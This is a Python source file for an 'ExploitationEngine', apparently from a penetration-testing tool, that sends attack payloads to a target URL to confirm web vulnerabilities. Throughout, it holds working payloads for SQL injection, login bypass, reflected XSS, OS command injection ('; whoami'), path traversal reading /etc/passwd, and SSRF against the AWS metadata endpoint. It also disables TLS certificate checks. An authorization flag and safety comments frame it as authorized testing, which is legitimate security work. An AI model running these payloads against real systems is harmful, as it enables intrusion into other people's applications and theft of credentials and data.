import logging
import requests
import urllib.parse
import re
import time
from typing import Dict, Any, List, Optional
from bs4 import BeautifulSoup

logger = logging.getLogger(__name__)

class ExploitationEngine:
    """
    Handles safe exploitation of vulnerabilities for authorized security testing.

    IMPORTANT: This module should only be used for authorized penetration testing
    with explicit written permission. Unauthorized use is illegal.
    """

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'RedTeam-SecurityTest/1.0'
        })
        # Safety: Maximum number of exploitation attempts
        self.max_attempts = 5
        # Safety: Timeout for requests
        self.timeout = 10

    def run_exploitation(self, finding: Dict[str, Any], authorization_confirmed: bool = False) -> Dict[str, Any]:
        """
        Attempt to exploit a given finding to confirm its validity.

        Args:
            finding: Dictionary containing vulnerability details
            authorization_confirmed: Must be True to run exploitation

        Returns:
            Dictionary with exploitation results
        """
        if not authorization_confirmed:
            return {
                "success": False,
                "message": "Exploitation requires explicit authorization confirmation.",
                "requires_authorization": True
            }

        logger.warning(f"ðŸŽ¯ EXPLOITATION ATTEMPT: {finding.get('title')} on {finding.get('target')}")

        exploit_method = self._get_exploit_method(finding)
        if not exploit_method:
            return {
                "success": False,
                "message": "No exploitation method available for this type of finding."
            }

        try:
            result = exploit_method(finding)
            logger.info(f"Exploitation result: {result.get('success')}")
            return result
        except Exception as e:
            logger.error(f"Exploitation failed: {str(e)}", exc_info=True)
            return {
                "success": False,
                "message": f"An error occurred during exploitation: {str(e)}"
            }

    def _get_exploit_method(self, finding: Dict[str, Any]):
        """Return the appropriate exploitation method based on the finding"""
        title = finding.get("title", "").lower()

        if "sql injection" in title:
            return self._exploit_sql_injection
        elif "xss" in title or "cross-site scripting" in title:
            return self._exploit_xss
        elif "csrf" in title or "cross-site request forgery" in title:
            return self._exploit_csrf
        elif "command injection" in title:
            return self._exploit_command_injection
        elif "path traversal" in title or "directory traversal" in title:
            return self._exploit_path_traversal
        elif "authentication bypass" in title or "broken authentication" in title:
            return self._exploit_auth_bypass
        elif "ssrf" in title or "server-side request forgery" in title:
            return self._exploit_ssrf

        return None

    def _exploit_sql_injection(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """
        Safely exploit SQL injection vulnerability to confirm it.
        Uses time-based and error-based detection.
        """
        logger.info(f"Testing SQL injection on: {finding.get('target')}")

        target_url = finding.get('target')
        vulnerable_param = finding.get('vulnerable_parameter', 'id')

        # SQL injection payloads (non-destructive)
        test_payloads = [
            # Time-based blind SQL injection (works on most databases)
            {"payload": "1' AND SLEEP(5)--", "type": "time-based", "expected_delay": 5},
            {"payload": "1' OR '1'='1", "type": "boolean-based", "expected_delay": 0},
            {"payload": "1' UNION SELECT NULL--", "type": "union-based", "expected_delay": 0},
            # Error-based
            {"payload": "1' AND 1=CONVERT(int, @@version)--", "type": "error-based", "expected_delay": 0},
        ]

        results = []

        for test in test_payloads[:self.max_attempts]:
            try:
                # Build URL with payload
                params = {vulnerable_param: test['payload']}

                start_time = time.time()
                response = self.session.get(
                    target_url,
                    params=params,
                    timeout=self.timeout + test['expected_delay'] + 2,
                    verify=False  # For testing environments
                )
                elapsed_time = time.time() - start_time

                # Check for time-based injection
                if test['type'] == 'time-based' and elapsed_time >= test['expected_delay']:
                    return {
                        "success": True,
                        "message": "SQL Injection vulnerability confirmed (Time-Based)",
                        "details": {
                            "vulnerability_type": "Time-Based Blind SQL Injection",
                            "payload_used": test['payload'],
                            "parameter": vulnerable_param,
                            "response_time": f"{elapsed_time:.2f}s",
                            "expected_delay": f"{test['expected_delay']}s",
                            "evidence": "Response time indicates database query execution"
                        }
                    }

                # Check for boolean-based injection (different response)
                if test['type'] == 'boolean-based':
                    # Compare with normal request
                    normal_response = self.session.get(target_url, params={vulnerable_param: '1'}, timeout=self.timeout, verify=False)
                    if len(response.text) != len(normal_response.text):
                        return {
                            "success": True,
                            "message": "SQL Injection vulnerability confirmed (Boolean-Based)",
                            "details": {
                                "vulnerability_type": "Boolean-Based SQL Injection",
                                "payload_used": test['payload'],
                                "parameter": vulnerable_param,
                                "response_length_diff": abs(len(response.text) - len(normal_response.text)),
                                "evidence": "Application returns different content based on SQL query result"
                            }
                        }

                # Check for error-based injection
                if test['type'] == 'error-based':
                    sql_errors = [
                        'sql syntax', 'mysql', 'postgresql', 'ora-', 'mssql',
                        'syntax error', 'unterminated', 'unexpected end',
                        'warning: mysql', 'pg_query()', 'sqlite_'
                    ]
                    response_text = response.text.lower()
                    for error in sql_errors:
                        if error in response_text:
                            return {
                                "success": True,
                                "message": "SQL Injection vulnerability confirmed (Error-Based)",
                                "details": {
                                    "vulnerability_type": "Error-Based SQL Injection",
                                    "payload_used": test['payload'],
                                    "parameter": vulnerable_param,
                                    "error_found": error,
                                    "evidence": "Database error message leaked in response"
                                }
                            }

                results.append({
                    "payload": test['payload'],
                    "type": test['type'],
                    "response_time": elapsed_time,
                    "status_code": response.status_code
                })

            except requests.Timeout:
                if test['type'] == 'time-based':
                    return {
                        "success": True,
                        "message": "SQL Injection vulnerability confirmed (Timeout indicates delay)",
                        "details": {
                            "vulnerability_type": "Time-Based Blind SQL Injection",
                            "payload_used": test['payload'],
                            "parameter": vulnerable_param,
                            "evidence": "Request timeout indicates successful database delay injection"
                        }
                    }
            except Exception as e:
                logger.error(f"Error testing SQL injection: {e}")
                continue

        return {
            "success": False,
            "message": "Could not confirm SQL injection vulnerability",
            "details": {"tests_performed": results}
        }

    def _exploit_xss(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """
        Test XSS vulnerability by injecting proof-of-concept payloads.
        """
        logger.info(f"Testing XSS on: {finding.get('target')}")

        target_url = finding.get('target')
        vulnerable_param = finding.get('vulnerable_parameter', 'q')

        # XSS payloads (progressively complex)
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
        ]

        for payload in xss_payloads[:self.max_attempts]:
            try:
                # Test GET-based XSS
                params = {vulnerable_param: payload}
                response = self.session.get(target_url, params=params, timeout=self.timeout, verify=False)

                # Check if payload is reflected in response without encoding
                if payload in response.text:
                    # Verify it's actually executable (not in comments, escaped, etc.)
                    soup = BeautifulSoup(response.text, 'html.parser')

                    # Check if payload appears in dangerous contexts
                    dangerous_contexts = [
                        str(tag) for tag in soup.find_all(['script', 'img', 'svg', 'iframe', 'input'])
                    ]

                    for context in dangerous_contexts:
                        if payload in context or urllib.parse.unquote(payload) in context:
                            return {
                                "success": True,
                                "message": "XSS vulnerability confirmed (Reflected)",
                                "details": {
                                    "vulnerability_type": "Reflected Cross-Site Scripting (XSS)",
                                    "payload_used": payload,
                                    "parameter": vulnerable_param,
                                    "context": context[:200],
                                    "evidence": "Payload reflected without proper encoding in dangerous HTML context",
                                    "severity": "High"
                                }
                            }

                # Check if any script tags were injected
                soup = BeautifulSoup(response.text, 'html.parser')
                scripts = soup.find_all('script')
                for script in scripts:
                    if 'alert' in str(script) or 'XSS' in str(script):
                        return {
                            "success": True,
                            "message": "XSS vulnerability confirmed",
                            "details": {
                                "vulnerability_type": "Cross-Site Scripting (XSS)",
                                "payload_used": payload,
                                "parameter": vulnerable_param,
                                "evidence": "Injected script tag found in response"
                            }
                        }

            except Exception as e:
                logger.error(f"Error testing XSS: {e}")
                continue

        return {
            "success": False,
            "message": "Could not confirm XSS vulnerability",
            "details": {"payloads_tested": len(xss_payloads)}
        }

    def _exploit_csrf(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """
        Test CSRF vulnerability by checking for token validation.
        """
        logger.info(f"Testing CSRF on: {finding.get('target')}")

        target_url = finding.get('target')

        try:
            # Step 1: Get the form
            response = self.session.get(target_url, timeout=self.timeout, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')

            forms = soup.find_all('form')
            if not forms:
                return {
                    "success": False,
                    "message": "No forms found to test CSRF"
                }

            csrf_vulnerable = []

            for idx, form in enumerate(forms[:3]):  # Test up to 3 forms
                # Check for CSRF token
                csrf_token_fields = form.find_all('input', attrs={'name': re.compile(r'csrf|token|_token', re.I)})

                if not csrf_token_fields:
                    form_action = form.get('action', target_url)
                    method = form.get('method', 'POST').upper()

                    csrf_vulnerable.append({
                        "form_index": idx,
                        "action": form_action,
                        "method": method,
                        "reason": "No CSRF token field found"
                    })

            if csrf_vulnerable:
                return {
                    "success": True,
                    "message": "CSRF vulnerability confirmed",
                    "details": {
                        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
                        "vulnerable_forms": csrf_vulnerable,
                        "evidence": "Forms submit without CSRF token validation",
                        "severity": "Medium",
                        "recommendation": "Implement CSRF tokens for all state-changing operations"
                    }
                }

            return {
                "success": False,
                "message": "CSRF tokens appear to be implemented",
                "details": {"forms_checked": len(forms)}
            }

        except Exception as e:
            logger.error(f"Error testing CSRF: {e}")
            return {
                "success": False,
                "message": f"Error during CSRF testing: {str(e)}"
            }

    def _exploit_command_injection(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """
        Test command injection by attempting to execute safe commands.
        """
        logger.info(f"Testing command injection on: {finding.get('target')}")

        target_url = finding.get('target')
        vulnerable_param = finding.get('vulnerable_parameter', 'cmd')

        # Safe command injection payloads (read-only)
        command_payloads = [
            "; whoami",
            "| whoami",
            "` whoami `",
            "&& whoami",
            "; echo 'VULNERABLE'",
            "|echo VULNERABLE",
        ]

        for payload in command_payloads[:self.max_attempts]:
            try:
                params = {vulnerable_param: payload}
                response = self.session.get(target_url, params=params, timeout=self.timeout, verify=False)

                # Check for command execution evidence
                indicators = ['root', 'www-data', 'VULNERABLE', 'uid=', 'gid=']
                response_text = response.text

                for indicator in indicators:
                    if indicator in response_text:
                        return {
                            "success": True,
                            "message": "Command Injection vulnerability confirmed",
                            "details": {
                                "vulnerability_type": "OS Command Injection",
                                "payload_used": payload,
                                "parameter": vulnerable_param,
                                "evidence": f"Command output detected in response: '{indicator}'",
                                "severity": "Critical",
                                "recommendation": "Never pass user input directly to system commands. Use allow-lists and proper input validation."
                            }
                        }

            except Exception as e:
                logger.error(f"Error testing command injection: {e}")
                continue

        return {
            "success": False,
            "message": "Could not confirm command injection vulnerability"
        }

    def _exploit_path_traversal(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """
        Test path traversal by attempting to read common system files.
        """
        logger.info(f"Testing path traversal on: {finding.get('target')}")

        target_url = finding.get('target')
        vulnerable_param = finding.get('vulnerable_parameter', 'file')

        # Path traversal payloads (safe files to read)
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

        for payload in traversal_payloads[:self.max_attempts]:
            try:
                params = {vulnerable_param: payload}
                response = self.session.get(target_url, params=params, timeout=self.timeout, verify=False)

                # Check for /etc/passwd content (Linux)
                if 'root:' in response.text and '/bin/' in response.text:
                    return {
                        "success": True,
                        "message": "Path Traversal vulnerability confirmed",
                        "details": {
                            "vulnerability_type": "Directory/Path Traversal",
                            "payload_used": payload,
                            "parameter": vulnerable_param,
                            "file_accessed": "/etc/passwd",
                            "evidence": "Successfully read /etc/passwd file content",
                            "severity": "High",
                            "recommendation": "Validate and sanitize all file paths. Use allow-lists for file access."
                        }
                    }

                # Check for win.ini content (Windows)
                if '[extensions]' in response.text or '[fonts]' in response.text:
                    return {
                        "success": True,
                        "message": "Path Traversal vulnerability confirmed",
                        "details": {
                            "vulnerability_type": "Directory/Path Traversal",
                            "payload_used": payload,
                            "parameter": vulnerable_param,
                            "file_accessed": "win.ini",
                            "evidence": "Successfully read win.ini file content",
                            "severity": "High"
                        }
                    }

            except Exception as e:
                logger.error(f"Error testing path traversal: {e}")
                continue

        return {
            "success": False,
            "message": "Could not confirm path traversal vulnerability"
        }

    def _exploit_auth_bypass(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """
        Test authentication bypass techniques.
        """
        logger.info(f"Testing authentication bypass on: {finding.get('target')}")

        target_url = finding.get('target')

        # Authentication bypass payloads
        bypass_credentials = [
            {"username": "admin' OR '1'='1", "password": "anything"},
            {"username": "admin'--", "password": ""},
            {"username": "' OR 1=1--", "password": ""},
            {"username": "admin", "password": "' OR '1'='1"},
        ]

        for creds in bypass_credentials[:self.max_attempts]:
            try:
                response = self.session.post(
                    target_url,
                    data=creds,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )

                # Check for successful authentication indicators
                success_indicators = [
                    'dashboard', 'welcome', 'logout', 'profile',
                    'logged in', 'authentication successful'
                ]

                response_text = response.text.lower()
                for indicator in success_indicators:
                    if indicator in response_text:
                        return {
                            "success": True,
                            "message": "Authentication Bypass vulnerability confirmed",
                            "details": {
                                "vulnerability_type": "Authentication Bypass (SQL Injection)",
                                "credentials_used": creds,
                                "evidence": f"Successfully bypassed authentication - found '{indicator}' in response",
                                "severity": "Critical",
                                "recommendation": "Use parameterized queries and proper authentication mechanisms"
                            }
                        }

            except Exception as e:
                logger.error(f"Error testing auth bypass: {e}")
                continue

        return {
            "success": False,
            "message": "Could not confirm authentication bypass vulnerability"
        }

    def _exploit_ssrf(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """
        Test SSRF vulnerability by attempting to access internal resources.
        """
        logger.info(f"Testing SSRF on: {finding.get('target')}")

        target_url = finding.get('target')
        vulnerable_param = finding.get('vulnerable_parameter', 'url')

        # SSRF test payloads (safe internal addresses)
        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://internal",
            "file:///etc/passwd",
        ]

        for payload in ssrf_payloads[:self.max_attempts]:
            try:
                params = {vulnerable_param: payload}
                response = self.session.get(target_url, params=params, timeout=self.timeout, verify=False)

                # Check for SSRF indicators
                if response.status_code == 200:
                    # Check for AWS metadata
                    if 'ami-id' in response.text or 'instance-id' in response.text:
                        return {
                            "success": True,
                            "message": "SSRF vulnerability confirmed (AWS Metadata Access)",
                            "details": {
                                "vulnerability_type": "Server-Side Request Forgery (SSRF)",
                                "payload_used": payload,
                                "parameter": vulnerable_param,
                                "evidence": "Successfully accessed AWS metadata endpoint",
                                "severity": "Critical"
                            }
                        }

                    # Check for internal content
                    if len(response.text) > 0 and response.text != "":
                        return {
                            "success": True,
                            "message": "SSRF vulnerability confirmed",
                            "details": {
                                "vulnerability_type": "Server-Side Request Forgery (SSRF)",
                                "payload_used": payload,
                                "parameter": vulnerable_param,
                                "evidence": "Server fetched content from internal URL",
                                "severity": "High"
                            }
                        }

            except Exception as e:
                logger.error(f"Error testing SSRF: {e}")
                continue

        return {
            "success": False,
            "message": "Could not confirm SSRF vulnerability"
        }

    def close(self):
        """Clean up resources"""
        self.session.close()
